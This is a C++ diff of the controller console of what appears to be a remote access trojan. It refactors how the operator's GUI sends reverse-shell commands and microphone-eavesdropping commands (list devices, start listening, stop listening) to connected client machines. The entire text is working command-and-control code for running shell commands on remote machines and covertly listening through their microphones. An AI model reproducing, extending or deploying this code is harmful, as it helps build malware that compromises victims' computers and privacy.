@@ -111,11 +111,7 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
     wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
     if (pageTitle == "Reverse Shell") {
         //Enviar comando para cerrar shell al cerra la tab
-        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-        strComando += CMD_DEL;
-        strComando += "exit\r\n";
-        p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
-        
+        p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
     }
     event.Skip();
 }
@@ -129,10 +125,7 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
 
     if (iIndex != -1) {
         p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
-        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-        strComando += CMD_DEL;
-        strComando += "exit\r\n";
-        p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+        p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
     }
 
     event.Skip();
@@ -211,11 +204,8 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
 
     Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
 
-    //Enviar comando al cliente para que ejecute
-    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
-    strComando += CMD_DEL;
-    strComando += "0";
-    p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+    //Enviar comando al cliente para que ejecute la shell
+    p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);
     
 }
 
@@ -255,18 +245,13 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
 
     }else if (iCode == WXK_RETURN) {
         wxString strCmdLine = this->txtConsole->GetRange(this->p_uliUltimo, this->txtConsole->GetLastPosition());
-        wxString str1 = std::to_string(EnumComandos::Reverse_Shell_Command);
-        str1 += CMD_DEL;
-        str1 += strCmdLine;
         this->vc_History.push_back(strCmdLine);
 
+        wxString str1 = strCmdLine;
         str1.append(1, '\r');
         str1.append(1, '\n');
         
-        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
-        strComando += CMD_DEL;
-        strComando += "0";
-        p_Servidor->cSend(this->sckCliente, str1.c_str(), str1.size()+1, 0, false);
+        p_Servidor->cChunkSend(this->sckCliente, str1.c_str(), str1.size(), 0, false, EnumComandos::Reverse_Shell_Command);
         
         this->p_uliUltimo = this->txtConsole->GetLastPosition() + 1;
         event.Skip();
@@ -328,34 +313,30 @@ panelMicrophone::panelMicrophone(wxWindow* pParent) :
 }
 
 void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
-    std::string strComando = std::to_string(EnumComandos::Mic_Refre_Dispositivos);
-    strComando.append(1, CMD_DEL);
-    strComando.append(1, '0');
-    this->EnviarComando(strComando);
+    std::string strComando = DUMMY_PARAM;
+    this->EnviarComando(strComando, EnumComandos::Mic_Refre_Dispositivos);
 }
 
 void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
-    std::string strComando = std::to_string(EnumComandos::Mic_Iniciar_Escucha);
-    strComando.append(1, CMD_DEL);
     
     wxString str_device_id = this->mic_devices->GetStringSelection();
     std::cout << str_device_id << std::endl;
     
     //Quien tiene mas de 10 microfonos :v ?
+    std::string strComando = "";
     strComando.append(1, str_device_id[1]);
 
-    this->EnviarComando(strComando);
+    this->EnviarComando(strComando, EnumComandos::Mic_Iniciar_Escucha);
 }
 
 void panelMicrophone::OnDetener(wxCommandEvent& event) {
-    std::string strComando = std::to_string(EnumComandos::Mic_Detener_Escucha);
-    strComando.append(1, CMD_DEL);
-    this->EnviarComando(strComando);
+    std::string strComando = DUMMY_PARAM;
+    this->EnviarComando(strComando, EnumComandos::Mic_Detener_Escucha);
 
     int iIndex = p_Servidor->IndexOf(this->strID);
     p_Servidor->vc_Clientes[iIndex]->ClosePlayer();
 }
 
-void panelMicrophone::EnviarComando(std::string pComando) {
-    p_Servidor->cSend(this->sckSocket, pComando.c_str(), pComando.size() + 1, 0, false);
+void panelMicrophone::EnviarComando(std::string pComando, int iComando) {
+    p_Servidor->cChunkSend(this->sckSocket, pComando.c_str(), pComando.size() + 1, 0, false, iComando);
 }
